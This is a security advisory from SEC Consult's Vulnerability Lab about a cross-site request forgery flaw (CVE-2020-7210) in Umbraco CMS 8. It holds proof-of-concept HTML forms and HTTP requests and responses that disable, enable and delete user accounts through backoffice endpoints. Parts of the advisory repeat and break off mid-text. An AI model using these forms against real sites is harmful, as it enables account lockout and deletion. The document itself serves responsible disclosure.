# Vulnerability Lab

With the **Vulnerability Lab**, SEC Consult **operates its own internal security laboratory**, in order to ensure an international know-how advantage over attackers in the areas of network and application security. In addition, this facility serves the support with high-quality penetration tests and with the evaluation of new technologies and is at the service of our customers. Thus, they receive the latest information about security gaps and valid statements about the risk profile of new technologies.

Our Vulnerability Lab follows a [Responsible Disclosure Policy](/vulnerability-lab/responsible-disclosure-policy/) which aims to provide vendors with the necessary information and timeframe needed to validate and fix a security flaw in order to mutually coordinate the public release of a security advisory as part of our responsible disclosure process. This document also clarifies the extent and limitation of effort the SEC Consult Vulnerability Lab will invest. It can be found [here](/vulnerability-lab/responsible-disclosure-policy/).

Here you find all our **[studies and whitepapers](/vulnerability-lab/studies-and-whitepapers/)**.

You can reach our Vulnerability Lab through security-research(at)sec-consult.com. The PGP key with fingerprint F9A9D4AF3DC2D298835090252D2DD7B5C6EE883F can be downloaded [here](https://keys.openpgp.org/vks/v1/by-fingerprint/F9A9D4AF3DC2D298835090252D2DD7B5C6EE883F).

The SEC Consult Vulnerability Lab is also an official [CNA](https://www.cve.org/PartnerInformation/ListofPartners/partner/SEC-VLab) (CVE Numbering Authority) and our scope for assigning CVE numbers is all vulnerabilities discovered in third-party hardware/software by the SEC Consult Vulnerability Lab, which are not in another CNA's scope.

Vendor description:
-------------------
"Umbraco 8 is the latest version of Umbraco CMS. It’s the fastest and best
version of Umbraco and a big step forward in regard to making your work
with Umbraco simpler; simpler to extend, simpler to edit, simpler to

Source: <https://umbraco.com/products/umbraco-cms/umbraco-8/>

Business recommendation:
------------------------
The vendor provides a patch and users of this product are urged to
immediately upgrade to the latest version available.

SEC Consult recommends to perform a thorough security review conducted by
security professionals to identify and resolve all security issues.

Vulnerability overview/description:
-----------------------------------
1) Cross-Site Request Forgery (CSRF)
An attacker can use cross-site request forgery to perform arbitrary web
requests with the identity of the victim, without being noticed by the
victim. This attack always requires some sort of user interaction, usually
the victim needs to click on an attacker-prepared link or visit a page
under control of the attacker. Due to this, an attacker is able to
enable/disable or delete accounts. This may lead to DoS of user accounts.

Proof of concept:
-----------------
1) Cross-Site Request Forgery (CSRF)
In a live attack scenario, the following HTML document would be hosted
on a malicious website, controlled by the attacker.

Example 1: HTML-code for disabling user:

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://<host-URL>/umbraco/backoffice/UmbracoApi/Users/PostDisableUsers?userIds=<USER-ID>"
method="POST">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

--------
POST /umbraco/backoffice/UmbracoApi/Users/PostDisableUsers?userIds=<USER-ID> HTTP/1.1
Host: <host-URL>
[...]
Cookie: <ADMIN-COOKIE>

Response:
---------

Example 2: HTML-code for enabling user:
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://<host-URL>/umbraco/backoffice/UmbracoApi/Users/PostEnableUsers?userIds=<USER-ID>"
method="POST">
      <input type="submit" value="Submit request" />
    </form>

As soon as an authenticated victim (admin) visits a website with this HTML code
embedded, the payload would get executed in the context of the victim's
session. Although responses to these requests are not delivered to the
attacker, in many cases it is sufficient to be able to compromise the
integrity of the victim's information stored on the site or to perform
certain, possibly compromising requests to other sites.

Vendor description:
-------------------
"Umbraco 8 is the latest version of Umbraco CMS. It’s the fastest and best
version of Umbraco and a big step forward in regard to making your work
with Umbraco simpler; simpler to extend, simpler to edit, simpler to
publish - simpler to use, simpler to enjoy."

Business recommendation:
------------------------
The vendor provides a patch and users of this product are urged to
immediately upgrade to the latest version available.

SEC Consult recommends to perform a thorough security review conducted by
security professionals to identify and resolve all security issues.

Vulnerability overview/description:
-----------------------------------
1) Cross-Site Request Forgery (CSRF)
An attacker can use cross-site request forgery to perform arbitrary web
requests with the identity of the victim, without being noticed by the
victim. This attack always requires some sort of user interaction, usually
the victim needs to click on an attacker-prepared link or visit a page
under control of the attacker. Due to this, an attacker is able to
enable/disable or delete accounts. This may lead to DoS of user accounts.

Proof of concept:
-----------------
1) Cross-Site Request Forgery (CSRF)
In a live attack scenario, the following HTML document would be hosted
on a malicious website, controlled by the attacker.

Example 1: HTML-code for disabling user:

<html>

The Umbraco CMS suffers from a cross-site request forgery (CSRF) vulnerability which could allow an attacker to perform arbitrary web requests with the identity of the victim, e.g. in order to enable/disable or delete user accounts.

## Vendor Description

*“Umbraco 8 is the latest version of Umbraco CMS. It’s the fastest and best version of Umbraco and a big step forward in regard to making your work with Umbraco simpler; simpler to extend, simpler to edit, simpler to publish – simpler to use, simpler to enjoy.*”

Source: <https://umbraco.com/products/umbraco-cms/umbraco-8/>

## Business Recommendation

The vendor provides a patch and users of this product are urged to immediately upgrade to the latest version available. An in-depth security analysis performed by security professionals is highly advised, as the software may be affected from further security issues.

## Vulnerability Overview / Description

### Cross-Site Request Forgery (CVE-2020-7210)

An attacker can use cross-site request forgery to perform arbitrary web requests with the identity of the victim, without being noticed by the victim. This attack always requires some sort of user interaction, usually the victim needs to click on an attacker-prepared link or visit a page under control of the attacker. Due to this, an attacker is able to enable/disable or delete accounts. This may lead to DoS of user accounts.

## Proof Of Concept

### Cross-Site Request Forgery (CVE-2020-7210)

In a live attack scenario, the following HTML document would be hosted on a malicious website, controlled by the attacker.

Example 1: HTML-code for disabling user:

***<html> <body> <script>history.pushState('', '', '/')</script> <form action="https://<host-URL>/umbraco/backoffice/UmbracoApi/Users/PostDisableUsers?userIds=<USER-ID>" method="POST"> <input type="submit" value="Submit request" /> </form> </body> </html>***

Request:

***POST /umbraco/backoffice/UmbracoApi/Users/PostDisableUsers?userIds=<USER-ID> HTTP/1.1 Host: <host-URL> [...] Cookie: <ADMIN-COOKIE>***

Response:

***HTTP/1.1 200 OK Cache-Control: no-store, must-revalidate, no-cache, max-age=0 Pragma: no-cache Content-Length: 112 Content-Type: application/json; charset=utf-8 Expires: Mon, 01 Jan 1990 00:00:00 GMT Set-Cookie: Date: Wed, 06 Nov 2019 10:57:45 GMT Connection: close )]}', {"notifications":[{"header":" is now disabled","message":"","type":3}],"message":" is now disabled"}***

Example 2: HTML-code for enabling user:

***<html> <body> <script>history.pushState('', '', '/')</script> <form action="https://<host-URL>/umbraco/backoffice/UmbracoApi/Users/PostEnableUsers?userIds=<USER-ID>" method="POST"> <input type="submit" value="Submit request" /> </form> </body> </html>***

Response:

***HTTP/1.1 200 OK Cache-Control: no-store, must-revalidate, no-cache, max-age=0 Pragma: no-cache Content-Length: 110 Content-Type: application/json; charset=utf-8 Expires: Mon, 01 Jan 1990 00:00:00 GMT Date: Wed, 06 Nov 2019 10:58:12 GMT Connection: close )]}', {"notifications":[{"header":"<USERNAME> is now enabled","message":"","type":3}],"message":"<USERNAME> is now enabled"}***

Example 3: HTML-code for deleting user:

***<html> <body> <script>history.pushState('', '', '/')</script> <form action="https://<host-URL>/umbraco/backoffice/UmbracoApi/Users/PostDeleteNonLoggedInUser?id=<USER-ID>" method="POST"> <input type="submit" value="Submit request" /> </form> </body> </html>***

Request:

***POST /umbraco/backoffice/UmbracoApi/Users/PostDeleteNonLoggedInUser?id=<USER-ID> HTTP/1.1 Host: <host-URL> [...] Cookie: <ADMIN-COOKIE>***

Response:

***HTTP/1.1 200 OK Cache-Control: no-store, must-revalidate, no-cache, max-age=0 Pragma: no-cache Content-Length: 114 Content-Type: application/json; charset=utf-8 Expires: Mon, 01 Jan 1990 00:00:00 GMT Set-Cookie: <ADMIN-COOKIE> Date: Wed, 06 Nov 2019 10:58:36 GMT Connection: close )]}', {"notifications":[{"header":"User <USERNAME> was deleted","message":"","type":3}],"message":"User <USERNAME> was deleted"}***

As soon as an authenticated victim (admin) visits a website with this HTML code embedded, the payload would get executed in the context of the victim’s session. Although responses to these requests are not delivered to the attacker, in many cases it is sufficient to be able to compromise the integrity of the victim’s information stored on the site or to perform certain, possibly compromising requests to other sites.
